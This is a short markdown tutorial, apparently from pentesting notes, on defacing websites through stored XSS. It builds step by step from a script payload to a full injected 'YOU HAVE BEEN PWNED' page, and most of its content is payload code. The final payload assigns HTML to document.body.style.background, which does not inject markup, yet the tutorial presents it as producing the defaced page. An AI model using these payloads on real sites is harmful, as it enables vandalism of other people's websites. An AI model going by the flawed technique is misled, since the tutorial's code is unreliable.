# XSS Defacing Attacks.
One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website.
We can utilize injected JavaScript code (through XSS) to make a web page look any way we like.

## Perfarming Defacing.
- To perform a XSS Defacing attack the first step must be to _find the appropriate payload_. eg:
```javascript
<script>document.body.style.background = "#141d2b"</script>
```
- After that we have to write the HTML document that we want to deploy into the target, eg: 
 ```html
<center>
    <h1 style="color: white">YOU HAVE BEEN PWNED</h1>
    <body style="background-color:#171717">
    <p style="color: white">
        <img src="IMGURL" height="400px">
    </p>
    <h2>XSS DEFACING</h2>
    <h3>by TBHD </h3>
</center>
```
- We will must _minify the HTML code into a single line_:
```html
<center><h1 style="color: white">YOU HAVE BEEN PWNED</h1><body style="background-color:#171717"><p style="color: white"><img src="IMGURL" height="400px"></p><h2>XSS DEFACING</h2><h3>by TBHD </h3></center>
```
- The last step is to _add the minified HTML code to our previous XSS payload_, switching the parametter in our payload for our html line, the pattern must be as follows: `<script>document.body.style.background='HTML'</script>` = `<>PAYLOAD='HTML'<>`.</br>
__The final payload should be as follows:__
```html
<script>document.body.style.background='<center><h1 style="color: white">YOU HAVE BEEN PWNED</h1><body style="background-color:#171717"><p style="color: white"><img src="http://192.168.1.54/skull.jpg" height="400px"></p><h2>XSS DEFACING</h2><h3>by TBHD </h3></center>'</script>
```
__XSS DEFACING FINAL RESULT__</br>
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/138ab5c6-9d62-4038-9c67-442ba4040264" width="450">



